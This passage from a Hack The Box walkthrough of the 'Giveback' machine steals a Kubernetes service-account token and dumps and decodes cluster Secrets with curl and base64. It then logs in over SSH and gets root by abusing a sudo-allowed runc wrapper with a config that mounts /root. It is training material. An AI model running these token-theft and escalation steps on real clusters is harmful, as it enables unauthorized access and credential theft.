If the token has read permissions on **Secrets** or nodes, we can obtain secrets/credentials or node access:

```bash
TOKEN="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
APIS="https://10.43.0.1:443"

# list namespaces
curl -k -H "Authorization: Bearer $TOKEN" $APIS/api/v1/namespaces | jq . -c

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   342  100   342    0     0   3511      0 --:--:-- --:--:-- --:--:--  3525
{"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"namespaces is forbidden: User \"system:serviceaccount:default:secret-reader-sa\" cannot list resource \"namespaces\" in API group \"\" at the cluster scope","reason":"Forbidden","details":{"kind":"namespaces"},"code":403}


# list pods (all namespaces if allowed, default otherwise)
curl -k -H "Authorization: Bearer $TOKEN" $APIS/api/v1/pods | jq . -c
curl -k -H "Authorization: Bearer $TOKEN" $APIS/api/v1/namespaces/default/pods | jq . -c

# list secrets in default namespace 
curl -k -H "Authorization: Bearer $TOKEN" $APIS/api/v1/namespaces/default/secrets | jq . -c

{"kind":"SecretList","apiVersion":"v1","metadata":{"resourceVersion":"2856692"},"items":[{"metadata":{"name":"beta-vino-wp-mariadb","namespace":"default","uid":"3473d5ec-b774-40c9-a249-81d51426a45e","resourceVersion":"2088227","creationTimestamp":"2024-09-21T22:17:31Z","labels":{"app.kubernetes.io/instance":"beta-vino-wp","app.kubernetes.io/managed-by":"Helm","app.kubernetes.io/name":"mariadb","app.kubernetes.io/part-of":"mariadb","app.kubernetes.io/version":"11.8.2","helm.sh/chart":"mariadb-21.0.0"},"annotations":{"meta.helm.sh/release-name":"beta-vino-wp","meta.helm.sh/release-namespace":"default"},"managedFields":[{"manager":"helm","operation":"Update","apiVersion":"v1","time":"2025-08-29T03:29:54Z","fieldsType":"FieldsV1","fieldsV1":{"f:data":{".":{},"f:mariadb-password":{},"f:mariadb-root-password":{}},"f:metadata":{"f:annotations":{".":{},"f:meta.helm.sh/release-name":{},"f:meta.helm.sh/release-namespace":{}},"f:labels":{".":{},"f:app.kubernetes.io/instance":{},"f:app.kubernetes.io/managed-by":{},"f:app.kubernetes.io/name":{},"f:app.kubernetes.io/part-of":{},"f:app.kubernetes.io/version":{},"f:helm.sh/chart":{}}},"f:type":{}}}]},"data":{"mariadb-password":"c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T","mariadb-root-password":"c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="},"type":"Opaque"},{"metadata":{"name":"beta-vino-wp-wordpress","namespace":"default","uid":"1cbbc5ac-1611-46af-8033-09e98dfc546b","resourceVersion":"2088228","creationTimestamp":"2024-09-21T22:17:31Z","labels":{"app.kubernetes.io/instance":"beta-vino-wp","app.kubernetes.io/managed-by":"Helm","app.kubernetes.io/name":"wordpress","app.kubernetes.io/version":"6.8.2","helm.sh/chart":"wordpress-25.0.5"},"annotations":{"meta.helm.sh/release-name":"beta-vino-wp","meta.helm.sh/release-namespace":"default"},"managedFields":[{"manager":"helm","operation":"Update","apiVersion":"v1","time":"2025-08-29T03:29:54Z","fieldsType":"FieldsV1","fieldsV1":{"f:data":{".":{},"f:wordpress-password":{}},"f:metadata":{"f:annotations":{".":{},"f:meta.helm.sh/release-name":{},"f:meta.helm.sh/release-namespace":{}},"f:labels":{".":{},"f:app.kubernetes.io/instance":{},"f:app.kubernetes.io/managed-by":{},"f:app.kubernetes.io/name":{},"f:app.kubernetes.io/version":{},"f:helm.sh/chart":{}}},"f:type":{}}}]},"data":{"wordpress-password":"TzhGN0tSNXpHaQ=="},"type":"Opaque"},{"metadata":{"name":"sh.helm.release.v1.beta-vino-wp.v58","namespace":"default","uid":"13034cd4-64e1-4e2e-9182-4ce0ffda27e8","resourceVersion":"2123405","creationTimestamp":"2025-08-30T05:17:49Z","labels":{"modifiedAt":"1726957051","name":"beta-vino-wp","owner":"helm","status":"superseded","version":"58"},"managedFields":[{"manager":"Helm","operation":"Update","apiVersion":"v1","time":"2025-08-30T05:21:45Z","fieldsType":"FieldsV1","fieldsV1":{"f:data":{".":{},"f:release":{}},"f:metadata":{"f:labels":{".":{},"f:modifiedAt":{},"f:name":{},"f:owner":{},"f:status":{},"f:version":{}}},"f:type":{}}}]},"data":
<SNIP>
{"metadata":{"name":"user-secret-babywyrm","namespace":"default","uid":"016548b2-4823-435c-8bd8-7dd993a5a6c1","resourceVersion":"2855789","creationTimestamp":"2025-11-03T19:18:00Z","ownerReferences":[{"apiVersion":"bitnami.com/v1alpha1","kind":"SealedSecret","name":"user-secret-babywyrm","uid":"74ff3e47-f5bc-45fb-9a3d-4e994f8771ec","controller":true}],"managedFields":[{"manager":"controller","operation":"Update","apiVersion":"v1","time":"2025-11-03T19:18:00Z","fieldsType":"FieldsV1","fieldsV1":{"f:data":{".":{},"f:MASTERPASS":{}},"f:metadata":{"f:ownerReferences":{".":{},"k:{\"uid\":\"74ff3e47-f5bc-45fb-9a3d-4e994f8771ec\"}":{}}},"f:type":{}}}]},"data":{"MASTERPASS":"QXkxTjZ0QnNrbVd1RFhoUTBoZ3VYZ2NuRnl0azFmNXI="},"type":"Opaque"},{"metadata":{"name":"user-secret-margotrobbie","namespace":"default","uid":"ba78c29a-87f9-45cd-9bd7-9400cfe1cd8d","resourceVersion":"2855901","creationTimestamp":"2025-11-03T19:18:07Z","ownerReferences":[{"apiVersion":"bitnami.com/v1alpha1","kind":"SealedSecret","name":"user-secret-margotrobbie","uid":"43fdd495-1a1a-43df-a02c-1b708f881302","controller":true}],"managedFields":[{"manager":"controller","operation":"Update","apiVersion":"v1","time":"2025-11-03T19:18:07Z","fieldsType":"FieldsV1","fieldsV1":{"f:data":{".":{},"f:USER_PASSWORD":{}},"f:metadata":{"f:ownerReferences":{".":{},"k:{\"uid\":\"43fdd495-1a1a-43df-a02c-1b708f881302\"}":{}}},"f:type":{}}}]},"data":{"USER_PASSWORD":"clZRcEc4WTNXQTc5U1NKQzczazFzaEpBVnB0cE1ybw=="},"type":"Opaque"},{"metadata":{"name":"user-secret-sydneysweeney","namespace":"default","uid":"b7841fa7-e0a9-40e8-a586-f420d12b38e2","resourceVersion":"2855862","creationTimestamp":"2025-11-03T19:18:05Z","ownerReferences":[{"apiVersion":"bitnami.com/v1alpha1","kind":"SealedSecret","name":"user-secret-sydneysweeney","uid":"681232a8-7468-471c-8c2a-0a23a190a105","controller":true}],"managedFields":[{"manager":"controller","operation":"Update","apiVersion":"v1","time":"2025-11-03T19:18:05Z","fieldsType":"FieldsV1","fieldsV1":{"f:data":{".":{},"f:USER_PASSWORD":{}},"f:metadata":{"f:ownerReferences":{".":{},"k:{\"uid\":\"681232a8-7468-471c-8c2a-0a23a190a105\"}":{}}},"f:type":{}}}]},"data":{"USER_PASSWORD":"TUdFdHBlRkhjT1g5dTM3Y2pjbE02eTZTa1F2VEMzcg=="},"type":"Opaque"}]}

# Read the default namespace secret
curl -k -H "Authorization: Bearer $TOKEN" $APIS/api/v1/namespaces/default/secrets/user-secret-babywyrm | jq .

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1150  100  1150    0     0    131      0  0:00:08  0:00:08 --:--:--   338
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "user-secret-babywyrm",
    "namespace": "default",
    "uid": "016548b2-4823-435c-8bd8-7dd993a5a6c1",
    "resourceVersion": "2855789",
    "creationTimestamp": "2025-11-03T19:18:00Z",
    "ownerReferences": [
      {
        "apiVersion": "bitnami.com/v1alpha1",
        "kind": "SealedSecret",
        "name": "user-secret-babywyrm",
        "uid": "74ff3e47-f5bc-45fb-9a3d-4e994f8771ec",
        "controller": true
      }
    ],
    "managedFields": [
      {
        "manager": "controller",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2025-11-03T19:18:00Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:data": {
            ".": {},
            "f:MASTERPASS": {}
          },
          "f:metadata": {
            "f:ownerReferences": {
              ".": {},
              "k:{\"uid\":\"74ff3e47-f5bc-45fb-9a3d-4e994f8771ec\"}": {}
            }
          },
          "f:type": {}
        }
      }
    ]
  },
  "data": {
    "MASTERPASS": "HTB{REDACTED_PASSWD}="
  },
  "type": "Opaque"
}

# echo 'QXkxTjZ0QnNrbVd1RFhoUTBoZ3VYZ2NuRnl0azFmNXI=' | base64 -d
HTB{REDACTED_PASSWD}
```

Extract passwords:

```bash
MASTERPASS: HTB{REDACTED_PASSWD}= | HTB{REDACTED_PASSWD}


# mariadb-password
echo "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T" | base64 -d
HTB{REDACTED_PASSWD}

# mariadb-root-password
echo "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==" | base64 -d
HTB{REDACTED_PASSWD}  

# WP_PASS
echo "TzhGN0tSNXpHaQ==" | base64 -d
HTB{REDACTED_PASSWD} 

# margotrobbie
echo "clZRcEc4WTNXQTc5U1NKQzczazFzaEpBVnB0cE1ybw==" | base64 -d
HTB{REDACTED_PASSWD}

# sydneysweeney
echo "TUdFdHBlRkhjT1g5dTM3Y2pjbE02eTZTa1F2VEMzcg==" | base64 -d
HTB{REDACTED_PASSWD} 
```

We have 2 new passwords and a Masterpass.
## SSH

With the decoded **MASTERPASS** and the found username we can access on [ssh](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Giveback/user]
└─$ ssh babywyrm@giveback.htb   

babywyrm@giveback:~$ cat user.txt
  HTB{{REDACTED_FLAG}}
```

User flag obtained.
# Privilege Escalation

Check sudo privileges:

```bash
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

Try the command:

```bash
babywyrm@giveback:~$ sudo /opt/debug help
Please enter the administrative password: 

Incorrect password
```

Here we have to use the `mariadb-password` but [Base64](../../../3%20-%20Tags/Hacking%20Concepts/Base64.md) encoded:

```bash
babywyrm@giveback:~$ sudo /opt/debug help
Validating sudo...
Please enter the administrative password:  HTB{REDACTED_PASSWD}

Both passwords verified. Executing the command...
NAME:
   runc - Open Container Initiative runtime

runc is a command line client for running applications packaged according to
the Open Container Initiative (OCI) format and is a compliant implementation of the
Open Container Initiative specification.

runc integrates well with existing process supervisors to provide a production
container runtime environment for applications. It can be used with your
existing process monitoring tools and the container will be spawned as a
direct child of the process supervisor.

Containers are configured using bundles. A bundle for a container is a directory
that includes a specification file named "config.json" and a root filesystem.
The root filesystem contains the contents of the container.

To start a new instance of a container:

    # runc run [ -b bundle ] <container-id>

Where "<container-id>" is your name for the instance of the container that you
are starting. The name you provide for the container instance must be unique on
your host. Providing the bundle directory using "-b" is optional. The default
value for "bundle" is the current directory.

USAGE:
   runc.amd64.debug [global options] command [command options] [arguments...]

VERSION:
   1.1.11
commit: v1.1.11-0-g4bccb38c
spec: 1.0.2-dev
go: go1.20.12
libseccomp: 2.5.4

COMMANDS:
   checkpoint  checkpoint a running container
   create      create a container
   delete      delete any resources held by the container often used with detached container
   events      display container events such as OOM notifications, cpu, memory, and IO usage statistics
   exec        execute new process inside the container
   kill        kill sends the specified signal (default: SIGTERM) to the container's init process
   list        lists containers started by runc with the given root
   pause       pause suspends all processes inside the container
   ps          ps displays the processes running inside a container
   restore     restore a container from a previous checkpoint
   resume      resumes all processes that have been previously paused
   run         create and run a container
   spec        create a new specification file
   start       executes the user defined process in a created container
   state       output the state of a container
   update      update container resource constraints
   features    show the enabled features
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug             enable debug logging
   --log value         set the log file to write runc logs to (default is '/dev/stderr')
   --log-format value  set the log format ('text' (default), or 'json') (default: "text")
   --root value        root directory for storage of container state (this should be located in tmpfs) (default: "/run/runc")
   --criu value        path to the criu binary used for checkpoint and restore (default: "criu")
   --systemd-cgroup    enable systemd cgroup support, expects cgroupsPath to be of form "slice:prefix:name" for e.g. "system.slice:runc:434234"
   --rootless value    ignore cgroup permission errors ('true', 'false', or 'auto') (default: "auto")
   --help, -h          show help
   --version, -v       print the version
```

For re-encoding make sure using `-n` to avoid newliners:

```
 echo -n 'sW5sp4spa3u7RLyetrekE4oS' | base64 
HTB{REDACTED_PASSWD}
```

We create a config file:

```bash
babywyrm@giveback:~$ cat config.json
{
  "ociVersion": "1.0.2",
  "process": {
    "user": {"uid": 0, "gid": 0},
    "args": ["/bin/cat", "/root/root.txt"],
    "cwd": "/",
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "terminal": false
  },
  "root": {"path": "rootfs"},
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind","ro"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind","ro"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind","ro"]},
    {"destination": "/root", "type": "bind", "source": "/root", "options": ["bind","ro"]}
  ],
  "linux": {"namespaces": [{"type": "mount"}]}
}

babywyrm@giveback:~$ mkdir rootfs
```

Now we can run the `debug` command again for a created container:

```bash
babywyrm@giveback:~$ sudo /opt/debug list
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
ID          PID         STATUS      BUNDLE          CREATED                          OWNER
demo        106359      running     /dev/shm/nlxz   2025-11-03T20:23:45.795924299Z   root
nlxz        107846      running     /dev/shm/nlxz   2025-11-03T20:27:57.884817582Z   root
babywyrm@giveback:~$ sudo /opt/debug exec nlxz /bin/cat /root/root.txt
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
  HTB{{REDACTED_FLAG}}
```

Pwned !!